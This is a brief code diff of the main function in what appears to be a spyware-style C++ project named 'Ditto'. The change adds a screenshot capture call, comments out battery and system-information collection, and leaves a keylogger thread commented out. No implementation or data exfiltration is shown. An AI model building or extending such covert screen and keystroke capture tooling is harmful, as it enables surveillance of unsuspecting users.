@@ -6,6 +6,7 @@
 #include "KeyLogger.hpp"
 #include "BatteryUtils.hpp"
 #include "SystemInfo.hpp"
+#include "Screen.hpp"
 #include <exception>
 #include <iostream>
 #include <chrono>
@@ -16,8 +17,10 @@ int main()
 	{
 		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");
 
-		BatteryUtils::save_battery_info();
-		SystemInfo::save_system_info();
+		Screen::instance().take_shot();
+
+		//BatteryUtils::save_battery_info();
+		//SystemInfo::save_system_info();
 
 		//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
 		//KeyLogger key_logger;
